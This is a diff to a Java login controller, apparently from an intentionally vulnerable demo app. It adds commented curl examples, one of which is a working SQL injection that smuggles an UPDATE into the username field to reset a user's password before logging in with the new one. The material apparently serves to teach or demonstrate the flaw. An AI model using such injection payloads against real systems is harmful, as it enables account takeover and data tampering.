@@ -13,8 +13,16 @@ public class LoginController {
 
     /*
     * NOTE: Though you may not be able to execute a 1=1 type login, you can still update the password and re-login a separate time
+    * VALID ACCESS
+    * $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"!GetSchwifty!"}' 'http://localhost:8080/login'
     *
+    * INVALID ACCESS
+    * $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login'
+    *
+    * SQL INJECTION
     * $ curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8080/login'
+    *
+    * VALID ACCESS WITH CHANGED PASSWORD
     * $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login'
     * */
 
